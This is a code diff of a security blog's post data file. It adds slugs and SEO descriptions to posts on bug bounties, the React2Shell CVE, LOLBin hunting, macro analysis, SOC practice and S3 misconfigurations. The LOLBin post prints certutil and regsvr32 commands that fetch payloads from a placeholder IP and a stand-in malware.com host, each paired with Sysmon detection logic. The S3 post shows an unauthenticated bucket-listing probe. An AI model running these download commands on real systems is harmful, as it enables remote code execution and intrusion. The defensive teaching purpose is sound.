@@ -1,7 +1,9 @@
 export const blogPosts = [
   {
     id: 1,
+    slug: "deezer-idor-private-playlist-metadata-leak",
     title: "Disclosure of Private Playlist Metadata (Deezer IDOR)",
+    seoDescription: "A technical writeup of a critical IDOR vulnerability discovered in Deezer's legacy API, leading to a €250 reward and a global patch.",
     date: "Dec 19, 2025",
     category: "bug-bounty",
     badge: "Bug Bounty Writeup",
@@ -65,14 +67,16 @@ Content-Type: application/json
   },
   {
     id: 2,
+    slug: "react2shell-cve-2025-55182-rce-analysis",
     title: "React2Shell (CVE-2025-55182): Active Exploitation Analysis",
+    seoDescription: "Detailed analysis of CVE-2025-55182 (React2Shell), a CVSS 10.0 RCE in React Server Components being exploited to drop miners and tunnelers.",
     date: "Dec 13, 2025",
     category: "cve threat-intel",
     badge: "Critical RCE",
     badgeType: "red",
     excerpt: "Deep dive into the CVSS 10.0 RCE in React Server Components. Analysis of active campaigns dropping MINOCAT tunnelers and XMRig miners.",
     content: `
-      <p>A new critical unauthenticated remote code execution (RCE) vulnerability in React Server Components, tracked as <strong>CVE-2025-55182</strong> (aka "React2Shell"), is being actively exploited in the wild. With a CVSS score of 10.0, this is a "drop everything and patch" event.</p>
+      <p>A new critical unauthenticated remote code execution (RCE) vulnerability in React Server Components, tracked as <strong>CVE-2025-55182</strong> (aka \"React2Shell\"), is being actively exploited in the wild. With a CVSS score of 10.0, this is a \"drop everything and patch\" event.</p>
       
       <h3>The Vulnerability</h3>
       <p>The flaw allows unauthenticated attackers to send a single HTTP request that executes arbitrary code with the privileges of the web server process. It affects <code>react-server-dom-webpack</code>, <code>react-server-dom-parcel</code>, and <code>react-server-dom-turbopack</code> (versions 19.0 - 19.2.0).</p>
@@ -99,25 +103,27 @@ Content-Type: application/json
   },
   {
     id: 3,
+    slug: "hunting-lolbins-threat-hunting-sysmon",
     title: "Hunting Living-Off-The-Land Binaries (LOLBins) with Sysmon",
+    seoDescription: "A tactical guide on using Sysmon to detect LOLBins like Certutil and Regsvr32 being used for malicious file downloads and execution.",
     date: "Feb 02, 2026",
     category: "blue-team",
     badge: "Threat Hunting",
     badgeType: "blue",
     excerpt: "Identifying advanced attackers relying on pre-installed, dual-use system administration tools like Certutil, PowerShell, and WMI to evade EDR and firewall detection schemas.",
     content: `
-      <p>A "Living off the Land Binary" (LOLBin) is any legitimate OS binary that can be co-opted by attackers to execute malicious code, bypass execution restrictions, or download files without triggering signature-based alerts.</p>
+      <p>A \"Living off the Land Binary\" (LOLBin) is any legitimate OS binary that can be co-opted by attackers to execute malicious code, bypass execution restrictions, or download files without triggering signature-based alerts.</p>
       
       <h3>Why are LOLBins Dangerous?</h3>
       <p>Since these binaries (like <code>certutil.exe</code>, <code>regsvr32.exe</code>, or <code>bitsadmin.exe</code>) are digitally signed by Microsoft and native to the OS, standard Antivirus platforms often whitelist their execution outright.</p>
 
       <h3>1. Certutil for File Downloads</h3>
       <p><code>certutil.exe</code> is intended for handling certificates, but attackers frequently use its <code>-urlcache</code> flag to download payloads directly from external IPs.</p>
-      <pre><code>certutil.exe -urlcache -split -f "http://10.10.10.5/payload.exe" C:\\Windows\\Temp\\payload.exe</code></pre>
+      <pre><code>certutil.exe -urlcache -split -f \"http://10.10.10.5/payload.exe\" C:\\\\Windows\\\\Temp\\\\payload.exe</code></pre>
       <p><strong>Detection Logic (Sysmon Event ID 1):</strong> Hunt for process creations of <code>certutil.exe</code> where the command line contains both <code>-urlcache</code> and <code>-split</code>.</p>
 
       <h3>2. Regsvr32 for AppLocker Bypass</h3>
-      <p>The "Squiblydoo" technique uses <code>regsvr32.exe</code> to load a COM scriptlet directly from the internet, executing code in memory and easily bypassing AppLocker policies.</p>
+      <p>The \"Squiblydoo\" technique uses <code>regsvr32.exe</code> to load a COM scriptlet directly from the internet, executing code in memory and easily bypassing AppLocker policies.</p>
       <pre><code>regsvr32 /s /n /u /i:http://malware.com/payload.sct scrobj.dll</code></pre>
       <p><strong>Detection Logic:</strong> Monitor for <code>regsvr32.exe</code> executing with the <code>/i</code> flag, especially when pointing to HTTP/S URLs and loading <code>scrobj.dll</code>.</p>
 
@@ -132,7 +138,9 @@ Content-Type: application/json
   },
   {
     id: 4,
+    slug: "linux-privilege-escalation-user-to-root-guide",
     title: "The Art of Privilege Escalation: From User to Root",
+    seoDescription: "Exploring common Linux privilege escalation vectors including SUID binaries, kernel exploits, and misconfigured cron jobs.",
     date: "Dec 01, 2025",
     category: "red-team",
     badge: "Red Team",
@@ -152,7 +160,9 @@ Content-Type: application/json
   },
   {
     id: 5,
+    slug: "analysing-malicious-office-macros-olevba-guide",
     title: "Analysing Malicious Office Macros via OLEVBA",
+    seoDescription: "A SOC analyst's guide to static analysis of malicious VBA macros using OLEVBA to extract execution strings without safe detonation.",
     date: "Jan 10, 2026",
     category: "cve threat-intel",
     badge: "Malware Analysis",
@@ -169,7 +179,7 @@ Content-Type: application/json
       <p>When reviewing the macro code extracted by OLEVBA, you will rarely see a clear <code>DownloadFile()</code> command. Instead, you'll see sophisticated obfuscation:</p>
       <ul>
           <li><strong>String Reversal:</strong> Writing payloads backwards (e.g., <code>exe.daolyap</code>) and using built-in string reversal functions right before execution.</li>
-          <li><strong>Chr() Encoding:</strong> Passing ASCII decimal arrays <code>Chr(112) & Chr(111) & Chr(119)...</code> to build <code>powershell</code> dynamically.</li>
+          <li><strong>Chr() Encoding:</strong> Passing ASCII decimal arrays <code>Chr(112) \u0026 Chr(111) \u0026 Chr(119)...</code> to build <code>powershell</code> dynamically.</li>
           <li><strong>Junk Code Injection:</strong> Massive blocks of commented code or useless variable declarations specifically designed to disrupt signature detection.</li>
       </ul>
 
@@ -199,7 +209,9 @@ End Sub
   },
   {
     id: 6,
+    slug: "xz-backdoor-supply-chain-attack-cve-2024-3094",
     title: "Supply Chain Security: Deep Dive into the XZ Backdoor (CVE-2024-3094)",
+    seoDescription: "Deconstructing the XZ Utils backdoor (CVE-2024-3094), a multi-year social engineering effort that targeted SSHD on Linux distributions.",
     date: "March 20, 2026",
     category: "cve threat-intel",
     badge: "Supply Chain",
@@ -228,32 +240,34 @@ End Sub
   },
   {
     id: 7,
+    slug: "soc-operational-excellence-effective-incident-response-playbooks",
     title: "SOC Operational Excellence: Building Effective Playbooks",
+    seoDescription: "How to build professional SOC playbooks following the SANS framework to reduce MTTR and ensure consistent incident response.",
     date: "Feb 15, 2026",
     category: "blue-team",
     badge: "SOC Operations",
     badgeType: "blue",
     excerpt: "Professionalizing the incident response lifecycle. How to build repeatable, measurable playbooks that reduce Mean Time to Respond (MTTR) and ensure consistency.",
     content: `
-      <p>A SOC is only as good as its playbooks. Without structured response procedures, analysts default to "ad-hoc" investigation, leading to inconsistent results, missed IOCs, and high MTTR (Mean Time to Respond).</p>
+      <p>A SOC is only as good as its playbooks. Without structured response procedures, analysts default to \"ad-hoc\" investigation, leading to inconsistent results, missed IOCs, and high MTTR (Mean Time to Respond).</p>
       
       <h3>The Anatomy of a Professional Playbook</h3>
       <p>Every effective SOC playbook should follow the SANS Incident Handling lifecycle while providing granular, technical instructions for the analyst:</p>
       <ol>
           <li><strong>Preparation:</strong> Ensuring the right logs (Sysmon, CrowdStrike, Firewall) are flowing into the SIEM.</li>
-          <li><strong>Identification/Triage:</strong> Using standardized logic to distinguish True Positives from False Positives (e.g., "If source IP is internal AND destination is a known C2...").</li>
+          <li><strong>Identification/Triage:</strong> Using standardized logic to distinguish True Positives from False Positives (e.g., \"If source IP is internal AND destination is a known C2...\").</li>
           <li><strong>Containment:</strong> Step-by-step guides for host isolation, credential reset, or firewall blocking.</li>
           <li><strong>Eradication:</strong> Removing the root cause (e.g., deleting a scheduled task or a malicious binary).</li>
           <li><strong>Recovery:</strong> Restoring systems to clean states.</li>
           <li><strong>Lessons Learned:</strong> Mandatory feedback loop to improve detection rules.</li>
       </ol>
       
-      <h3>Automation & SOAR</h3>
-      <p>Modern playbooks shouldn't be static PDFs. By leveraging <strong>SOAR</strong> (Security Orchestration, Automation, and Response), we can automate the "grunt work":</p>
+      <h3>Automation \u0026 SOAR</h3>
+      <p>Modern playbooks shouldn't be static PDFs. By leveraging <strong>SOAR</strong> (Security Orchestration, Automation, and Response), we can automate the \"grunt work\":</p>
       <ul>
           <li>Auto-enriching IPs via VirusTotal or AbuseIPDB.</li>
           <li>Auto-checking if an email sender has a low domain reputation.</li>
-          <li>Providing "one-click" host isolation buttons for analysts.</li>
+          <li>Providing \"one-click\" host isolation buttons for analysts.</li>
       </ul>
       
       <h3>Continuous Improvement</h3>
@@ -262,27 +276,29 @@ End Sub
   },
   {
     id: 8,
+    slug: "purple-teaming-operationalizing-feedback-loop",
     title: "Purple Teaming: Operationalizing the Feedback Loop",
+    seoDescription: "Bridging the gap between offensive simulations and defensive detection engineering through systematic Purple Team cycles.",
     date: "Jan 28, 2026",
     category: "blue-team",
     badge: "Purple Team",
     badgeType: "violet",
     excerpt: "Moving beyond silos. How to leverage offensive insights to validate and harden defensive controls through iterative simulation and detection engineering.",
     content: `
-      <p>Purple Teaming is not just a "meeting" between Red and Blue teams; it is a systematic methodology to bridge the gap between offensive capabilities and defensive resilience.</p>
+      <p>Purple Teaming is not just a \"meeting\" between Red and Blue teams; it is a systematic methodology to bridge the gap between offensive capabilities and defensive resilience.</p>
       
       <h3>The Purple Team Cycle</h3>
       <p>In our SOC, we operate on a recursive Purple Team cycle:</p>
       <ol>
-          <li><strong>Threat Hypothesis:</strong> Select a MITRE ATT&CK technique (e.g., T1055 - Process Injection).</li>
+          <li><strong>Threat Hypothesis:</strong> Select a MITRE ATT\u0026CK technique (e.g., T1055 - Process Injection).</li>
           <li><strong>Offensive Simulation:</strong> The (internal or external) Red Team executes a controlled simulation of the technique in a lab or staging environment.</li>
           <li><strong>Defensive Triage:</strong> The Blue Team checks if the activity was logged (Visibility) and if it triggered an alert (Detection).</li>
-          <li><strong>Gap Analysis:</strong> If detection failed, we ask: "Was it because of log misconfiguration, or was the detection rule too narrow?"</li>
+          <li><strong>Gap Analysis:</strong> If detection failed, we ask: \"Was it because of log misconfiguration, or was the detection rule too narrow?\"</li>
           <li><strong>Detection Engineering:</strong> We author and test new Sigma or Splunk rules based on the telemetry captured during simulation.</li>
       </ol>
       
       <h3>Real-World Example: LSASS Memory Dumping</h3>
-      <p>During a recent exercise, we simulated LSASS dumping using <code>procdump.exe</code>. While our EDR caught the activity, our SIEM didn't alert because the Sysmon rules were only looking for <code>mimikatz</code>. By broadening our detection to look for specific access masks on the LSASS process (Event ID 10), we hardened our defense against future "Day Zero" credential theft tools.</p>
+      <p>During a recent exercise, we simulated LSASS dumping using <code>procdump.exe</code>. While our EDR caught the activity, our SIEM didn't alert because the Sysmon rules were only looking for <code>mimikatz</code>. By broadening our detection to look for specific access masks on the LSASS process (Event ID 10), we hardened our defense against future \"Day Zero\" credential theft tools.</p>
       
       <h3>Conclusion</h3>
       <p>By treating security as a collaborative, iterative process rather than a static wall, we ensure that our defenses are grounded in reality, not just theory. That is the true value of a Purple Team approach.</p>
@@ -290,7 +306,9 @@ End Sub
   },
   {
     id: 9,
+    slug: "active-directory-security-hardening-domain-controllers",
     title: "Active Directory Security: Hardening the Kingdom",
+    seoDescription: "A strategic guide to hardening Active Directory, implementing tiered administration models, and monitoring for DCSync attacks.",
     date: "March 05, 2026",
     category: "blue-team",
     badge: "Enterprise Security",
@@ -303,8 +321,8 @@ End Sub
       <p>Most AD compromises don't start with a complex exploit; they start with misconfigurations:</p>
       <ul>
           <li><strong>Kerberoasting:</strong> Stealing service account tickets to crack their passwords offline.</li>
-          <li><strong>AS-REP Roasting:</strong> Targeting accounts with "Do not require Kerberos preauthentication" enabled.</li>
-          <li><strong>Privileged Group Overload:</strong> Too many users in the "Domain Admins" group, violating the principle of least privilege.</li>
+          <li><strong>AS-REP Roasting:</strong> Targeting accounts with \"Do not require Kerberos preauthentication\" enabled.</li>
+          <li><strong>Privileged Group Overload:</strong> Too many users in the \"Domain Admins\" group, violating the principle of least privilege.</li>
       </ul>
       
       <h3>Strategic Hardening: The Tiered Model</h3>
@@ -322,17 +340,19 @@ End Sub
   },
   {
     id: 10,
+    slug: "ai-driven-phishing-llm-social-engineering-threats",
     title: "The Rise of AI-Driven Phishing: A Modern Threat",
+    seoDescription: "How Large Language Models (LLMs) are used to automate hyper-realistic phishing and vishing campaigns, and how organizations can defend themselves.",
     date: "Feb 28, 2026",
     category: "cve threat-intel",
     badge: "Emerging Threat",
     badgeType: "red",
     excerpt: "How Large Language Models (LLMs) are being used to craft hyper-realistic, personalized phishing campaigns that bypass traditional email filters and user awareness training.",
     content: `
-      <p>The days of "broken English" and obvious spelling errors in phishing emails are over. Modern threat actors are now leveraging Large Language Models (LLMs) to automate the delivery of sophisticated, highly personalized social engineering attacks at scale.</p>
+      <p>The days of \"broken English\" and obvious spelling errors in phishing emails are over. Modern threat actors are now leveraging Large Language Models (LLMs) to automate the delivery of sophisticated, highly personalized social engineering attacks at scale.</p>
       
       <h3>What has changed?</h3>
-      <p>Previously, a high-quality "spear-phishing" attack required hours of manual research on a target. Today, AI can:</p>
+      <p>Previously, a high-quality \"spear-phishing\" attack required hours of manual research on a target. Today, AI can:</p>
       <ul>
           <li><strong>Scrape LinkedIn/Social Media:</strong> Automatically gather context about a target's role, recent projects, and professional tone.</li>
           <li><strong>Clone Writing Styles:</strong> Replicate the exact tone of a CEO or IT manager based on public memos or past emails.</li>
@@ -340,51 +360,55 @@ End Sub
       </ul>
       
       <h3>Vishing and Deepfakes</h3>
-      <p>Beyond text-based phishing, we are seeing a spike in <strong>AI Voice Cloning (Vishing)</strong>. Attackers only need a 30-second clip of a person's voice to clone it well enough to fool an employee over a brief phone call, often requesting "urgent" wire transfers or MFA resets.</p>
+      <p>Beyond text-based phishing, we are seeing a spike in <strong>AI Voice Cloning (Vishing)</strong>. Attackers only need a 30-second clip of a person's voice to clone it well enough to fool an employee over a brief phone call, often requesting \"urgent\" wire transfers or MFA resets.</p>
       
       <h3>Defensive Strategy</h3>
       <p>Traditional awareness training (looking for typos) is no longer enough. Organizations must shift toward:</p>
       <ul>
           <li><strong>Strict Process-Based Controls:</strong> No sensitive action (wire transfer, password reset) should be performed via email or voice alone; out-of-band verification is mandatory.</li>
-          <li><strong>AI-Powered Security Filters:</strong> Using machine learning to detect anomalous writing patterns that "feel" artificial.</li>
-          <li><strong>Hardware MFA:</strong> Using FIDO2/Passkeys (like YubiKeys) to make "credential harvesting" pages useless, regardless of how convincing the phishing email is.</li>
+          <li><strong>AI-Powered Security Filters:</strong> Using machine learning to detect anomalous writing patterns that \"feel\" artificial.</li>
+          <li><strong>Hardware MFA:</strong> Using FIDO2/Passkeys (like YubiKeys) to make \"credential harvesting\" pages useless, regardless of how convincing the phishing email is.</li>
       </ul>
     `
   },
   {
     id: 11,
+    slug: "optimizing-microsoft-sentinel-kql-soc-analysts",
     title: "Optimizing Microsoft Sentinel for SOC L1 Analysts",
+    seoDescription: "A tactical guide to reducing alert fatigue in Azure Sentinel using KQL functions, watchlists, and entity mapping.",
     date: "Feb 10, 2026",
     category: "blue-team",
     badge: "SOC Strategy",
     badgeType: "blue",
     excerpt: "A tactical guide to reducing alert fatigue in Azure Sentinel. How to use KQL functions, watchlists, and automation rules to surface the signals that truly matter.",
     content: `
-      <p>As a SOC L1 analyst, I've spent thousands of hours in <strong>Microsoft Sentinel</strong>. If not tuned correctly, Sentinel can become a "wall of noise." The key to effective monitoring is moving beyond simple "IF activity THEN alert" logic.</p>
+      <p>As a SOC L1 analyst, I've spent thousands of hours in <strong>Microsoft Sentinel</strong>. If not tuned correctly, Sentinel can become a \"wall of noise.\" The key to effective monitoring is moving beyond simple \"IF activity THEN alert\" logic.</p>
       
       <h3>1. Leveraging Watchlists for Context</h3>
-      <p>Instead of hardcoding "Expected IPs" into dozens of KQL rules, use <strong>Watchlists</strong>. This allows you to update a central list of authorized VPN ranges or VIP users without touching the underlying detection logic. It makes the SOC more agile and reduces false positives significantly.</p>
+      <p>Instead of hardcoding \"Expected IPs\" into dozens of KQL rules, use <strong>Watchlists</strong>. This allows you to update a central list of authorized VPN ranges or VIP users without touching the underlying detection logic. It makes the SOC more agile and reduces false positives significantly.</p>
       
       <h3>2. The Power of KQL Functions</h3>
-      <p>Don't repeat yourself. If you have a complex logic for identifying "Anomalous Sign-ins from New Countries," save it as a <strong>Function</strong>. This allows other analysts to call your logic with one word (e.g., <code>GetAnomalousLogins()</code>) across multiple hunting queries.</p>
+      <p>Don't repeat yourself. If you have a complex logic for identifying \"Anomalous Sign-ins from New Countries,\" save it as a <strong>Function</strong>. This allows other analysts to call your logic with one word (e.g., <code>GetAnomalousLogins()</code>) across multiple hunting queries.</p>
       
       <h3>3. Entity Mapping: The Key to Investigation</h3>
-      <p>Always ensure your Analytics Rules are mapping <strong>Entities</strong> (Accounts, IPs, Hosts) correctly. This allows Sentinel to automatically build a "Graph" of the incident, showing you how a single IP connected to multiple failed logins across different accounts, saving you 20 minutes of manual pivoting per case.</p>
+      <p>Always ensure your Analytics Rules are mapping <strong>Entities</strong> (Accounts, IPs, Hosts) correctly. This allows Sentinel to automatically build a \"Graph\" of the incident, showing you how a single IP connected to multiple failed logins across different accounts, saving you 20 minutes of manual pivoting per case.</p>
       
       <h3>4. Use Automation for Suppression</h3>
-      <p>If a specific "Known Good" system triggers a "Potential Scanning" alert every Tuesday at 2 PM during a vulnerability scan, don't just close it. Build an <strong>Automation Rule</strong> to auto-resolve that specific incident if the source IP matches your scanner. Focus your human brain on the threats that *can't* be automated.</p>
+      <p>If a specific \"Known Good\" system triggers a \"Potential Scanning\" alert every Tuesday at 2 PM during a vulnerability scan, don't just close it. Build an <strong>Automation Rule</strong> to auto-resolve that specific incident if the source IP matches your scanner. Focus your human brain on the threats that *can't* be automated.</p>
     `
   },
   {
     id: 12,
+    slug: "leaky-s3-buckets-bug-bounty-hunter-guide",
     title: "Exploiting Misconfigured S3 Buckets: A Common Cloud Flaw",
+    seoDescription: "A bug bounty hunter's perspective on identifying and exploiting public S3 buckets, and how developers can remediate these flaws.",
     date: "Jan 15, 2026",
     category: "bug-bounty",
     badge: "Cloud Security",
     badgeType: "gold",
     excerpt: "A bug bounty hunter's perspective on identifying and exploiting public S3 buckets. Why technical 'defaults' are still one of the leading causes of massive data leaks.",
     content: `
-      <p>Despite years of warnings, "Leaky S3 Buckets" remain one of the most common findings in bug bounty programs. When developers prioritize speed over security, they often leave cloud storage accessible to the public, inadvertently exposing TBs of sensitive data.</p>
+      <p>Despite years of warnings, \"Leaky S3 Buckets\" remain one of the most common findings in bug bounty programs. When developers prioritize speed over security, they often leave cloud storage accessible to the public, inadvertently exposing TBs of sensitive data.</p>
       
       <h3>How I Find Them</h3>
       <p>The first step is <strong>Subdomain Enumeration</strong> and <strong>Fuzzing</strong>. Tools like <code>ffuf</code> or <code>gobuster</code> pointing at common naming conventions (e.g., <code>company-prod-backup</code>, <code>test-data-internal</code>) often reveal the URL endpoints for these buckets.</p>
@@ -392,14 +416,14 @@ End Sub
       <h3>Testing for Public Access</h3>
       <p>Once a potential bucket URL is found (e.g., <code>https://target-dev.s3.amazonaws.com</code>), I use the AWS CLI to test permissions:</p>
       <pre><code>aws s3 ls s3://target-dev --no-sign-request</code></pre>
-      <p>If the response lists files, the bucket has "List" permissions enabled for the world. The real "jackpot" is "Write" permission, which allows an attacker to upload their own malicious files, potentially leading to stored XSS or even remote code execution if the bucket hosts web assets.</p>
+      <p>If the response lists files, the bucket has \"List\" permissions enabled for the world. The real \"jackpot\" is \"Write\" permission, which allows an attacker to upload their own malicious files, potentially leading to stored XSS or even remote code execution if the bucket hosts web assets.</p>
       
-      <h3>The "Bypass" - Authenticated Users</h3>
-      <p>A common mistake developers make is setting permissions to <strong>"All Authenticated Users"</strong>. They assume this means "Users in my AWS account," but it actually means <strong>"Anyone with a valid AWS account"</strong> (including the attacker). This is a critical distinction that often leads to "Full Control" findings.</p>
+      <h3>The \"Bypass\" - Authenticated Users</h3>
+      <p>A common mistake developers make is setting permissions to <strong>\"All Authenticated Users\"</strong>. They assume this means \"Users in my AWS account,\" but it actually means <strong>\"Anyone with a valid AWS account\"</strong> (including the attacker). This is a critical distinction that often leads to \"Full Control\" findings.</p>
       
       <h3>Remediation for Developers</h3>
       <ol>
-          <li>Enable <strong>"Block Public Access"</strong> at the account level.</li>
+          <li>Enable <strong>\"Block Public Access\"</strong> at the account level.</li>
           <li>Use <strong>IAM Roles</strong> and <strong>Bucket Policies</strong> instead of ACLs (Legacy).</li>
           <li>Implement <strong>VPC Endpoints</strong> so your S3 traffic never even touches the public internet.</li>
       </ol>
